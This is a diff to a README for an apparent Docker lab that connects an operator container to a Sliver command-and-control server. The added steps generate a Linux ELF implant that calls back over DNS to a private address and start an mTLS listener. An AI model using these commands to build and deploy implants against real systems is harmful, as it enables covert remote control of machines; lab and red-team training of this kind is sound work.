@@ -45,13 +45,37 @@ In a second terminal launch into the operator machine
 ```console
 docker exec -it operator /bin/bash
 ```
-Then in operator's bash terminal
+Then in operator's bash terminal to connect operator to sliver-server using main.py
 ```bash
-sliver-client import /workspace/operator1_localhost.cfg
-sliver-client
+python eshuCLP/main.py
 ```
 
-Check on server side to see "operator1 has joined the game"
+#### To throw an exploit using Sliver
+GO back to the sliver terminal. If exited, start up again
+```bash
+sliver-server
+```
+
+In sliver server console, generate implant
+```console
+generate --dns 10.1.1.3 --os linux --arch amd64 --format elf --save /workspace/
+```
+
+Start listener and list jobs
+```console
+mtls
+jobs
+```
+
+In operator, verify port 8888 is open
+```console
+netstat -antop | grep 8888
+```
+
+Check that elf implant file was created in operator
+```console
+ls
+```
 
 #### Clean Up
 To stop all running containers
